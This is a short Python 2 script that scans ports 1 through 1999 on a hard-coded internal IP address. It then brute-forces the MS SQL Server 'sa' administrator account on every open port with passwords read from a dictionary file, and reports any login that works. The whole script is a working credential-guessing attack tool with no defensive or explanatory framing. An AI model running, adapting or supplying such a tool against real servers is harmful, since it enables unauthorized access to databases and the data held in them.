import pymssql,os,socket,thread,time

def sock(ip,port):
	try:
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		result=s.connect_ex((ip,port))
		if result == 0:
			lock.acquire()
			print str(port)+'open'
			listp.append(str(port))	
			lock.release()	
			s.close()
	except:
		print 'fail'

def ip_scan(ip):
	try:
		for i in range(1,2000):
			thread.start_new(sock,(ip,int(i)))
			time.sleep(0.001)
		print 'the port:',listp
		dict(ip,listp)	
	except:
		print 'fail to scan'

def dict(ip,listp):
	f = open('/root/dict.txt','r')
	fpasswd = f.readlines()
	for passwd in fpasswd:
		mssql(ip,passwd.strip(),listp)

def mssql(ip,passwd,listp):
	for port in listp:
		print port
		time.sleep(0.1)
		try:
			con=pymssql.connect(host=ip+str(':')+str(port),user='sa',password=passwd,timeout=1,login_timeout=1)
			print ip,'connect ok and','password:'+str(passwd),'ok'
			con.close()
			os._exit(0)
		except:
			print ip,'connect down or',passwd,'error'

if __name__ == '__main__':
	listp=[]
	global listp
	ip='192.168.1.45'
	lock=thread.allocate()
	ip_scan(ip)
